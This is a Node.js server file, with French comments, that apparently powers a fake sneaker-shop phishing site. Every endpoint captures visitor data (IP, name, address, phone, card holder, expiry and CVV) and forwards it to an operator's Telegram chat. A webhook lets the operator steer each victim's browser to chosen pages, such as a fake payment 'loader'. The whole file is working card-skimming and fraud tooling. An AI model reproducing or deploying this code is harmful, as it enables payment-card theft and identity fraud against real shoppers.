import express from 'express';
import path from 'path';
import bodyParser from 'body-parser';
import cors from 'cors';
import fetch from 'node-fetch';
import { v4 as uuidv4 } from 'uuid';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname,'public')));

// Telegram variables (Render)
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}` : null;

if(!BOT_TOKEN || !CHAT_ID) console.warn('⚠️ BOT_TOKEN ou CHAT_ID non défini.');

// Sessions par IP
const sessions = {}; // ip -> { data:{page, pair, delivery, card}, redirect:null }

// Envoi notif Telegram
async function sendTelegramNotif(data){
  if(!TELEGRAM_API || !CHAT_ID) return;
  const lines = [];
  if(data.ip) lines.push('🌐 IP: ' + data.ip);
  if(data.page) lines.push('📄 Page: ' + data.page);
  if(data.pair) lines.push('👟 Paire choisie: ' + data.pair);
  if(data.delivery){
    lines.push(`📦 Livraison: ${data.delivery.nom} ${data.delivery.prenom}`);
    lines.push(`🏠 Adresse: ${data.delivery.adresse}`);
    lines.push(`📞 Tel: ${data.delivery.telephone}`);
  }
  if(data.card){
    lines.push(`💳 Carte: **** **** **** ${data.card.panMasked}`);
    lines.push(`📝 Titulaire: ${data.card.nomTitulaire}`);
    lines.push(`📅 Expiry: ${data.card.expiry}`);
    lines.push(`🔒 CVV: ${data.card.cvv}`);
  }

  const text = lines.join('\n');

  const keyboard = {
    inline_keyboard:[
      [{text:'➡️ Accueil', callback_data:'redirect|'+data.ip+'|/' }],
      [{text:'👟 Produit', callback_data:'redirect|'+data.ip+'|/product.html'}],
      [{text:'📦 Commande', callback_data:'redirect|'+data.ip+'|/order.html'}],
      [{text:'💳 Paiement', callback_data:'redirect|'+data.ip+'|/loader.html'}]
    ]
  };

  try {
    await fetch(`${TELEGRAM_API}/sendMessage`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode:'HTML',
        reply_markup: keyboard
      })
    });
  } catch(err){
    console.error('Erreur Telegram:', err);
  }
}

// Middleware pour récupérer IP IPv4
function getIP(req){
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  if(ip.includes(',')) ip = ip.split(',')[0];
  if(ip.includes('::ffff:')) ip = ip.split('::ffff:')[1];
  return ip;
}

// Endpoint visite
app.get('/api/visit', (req,res)=>{
  const ip = getIP(req);
  sessions[ip] = sessions[ip] || { data:{page:'Accueil', ip}, redirect:null };
  sendTelegramNotif(sessions[ip].data);
  res.json({ok:true, ip});
});

// Endpoint choix paire
app.post('/api/pair', (req,res)=>{
  const {pair} = req.body;
  const ip = getIP(req);
  sessions[ip] = sessions[ip] || { data:{ip}, redirect:null };
  sessions[ip].data.page = 'Produit';
  sessions[ip].data.pair = pair;
  sendTelegramNotif(sessions[ip].data);
  res.json({ok:true});
});

// Endpoint livraison
app.post('/api/delivery', (req,res)=>{
  const {nom, prenom, adresse, telephone} = req.body;
  const ip = getIP(req);
  sessions[ip] = sessions[ip] || { data:{ip}, redirect:null };
  sessions[ip].data.page = 'Commande';
  sessions[ip].data.delivery = {nom, prenom, adresse, telephone};
  sendTelegramNotif(sessions[ip].data);
  res.json({ok:true});
});

// Endpoint paiement
app.post('/api/payment', (req,res)=>{
  const {cardNumber, expiry, cvv, nomTitulaire} = req.body;
  const ip = getIP(req);
  sessions[ip] = sessions[ip] || { data:{ip}, redirect:null };
  sessions[ip].data.page = 'Paiement';
  sessions[ip].data.card = {
    panMasked: cardNumber.slice(-4),
    expiry, cvv, nomTitulaire
  };
  sendTelegramNotif(sessions[ip].data);
  res.json({ok:true});
});

// Polling frontend pour redirection bot
app.get('/api/status', (req,res)=>{
  const ip = getIP(req);
  res.json({redirect: sessions[ip]?.redirect || null});
});

// Telegram webhook
app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
  const body = req.body;
  if(body?.callback_query){
    const cb = body.callback_query;
    const [action, ip, url] = (cb.data||'').split('|');
    if(action==='redirect' && sessions[ip]){
      sessions[ip].redirect = url;
      sessions[ip].data.page = 'Redirection admin vers '+url;
      sendTelegramNotif(sessions[ip].data);
      await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({callback_query_id:cb.id, text:'Redirection envoyée.'})
      });
    }
  }
  res.sendStatus(200);
});

// Pages
app.get('/', (req,res)=>res.sendFile(path.join(__dirname,'public','index.html')));
app.get('/product.html', (req,res)=>res.sendFile(path.join(__dirname,'public','product.html')));
app.get('/order.html', (req,res)=>res.sendFile(path.join(__dirname,'public','order.html')));
app.get('/payment.html', (req,res)=>res.sendFile(path.join(__dirname,'public','payment.html')));
app.get('/loader.html', (req,res)=>res.sendFile(path.join(__dirname,'public','loader.html')));
app.get('/payment_accepted.html', (req,res)=>res.sendFile(path.join(__dirname,'public','payment_accepted.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=>console.log('Server ready on', PORT));
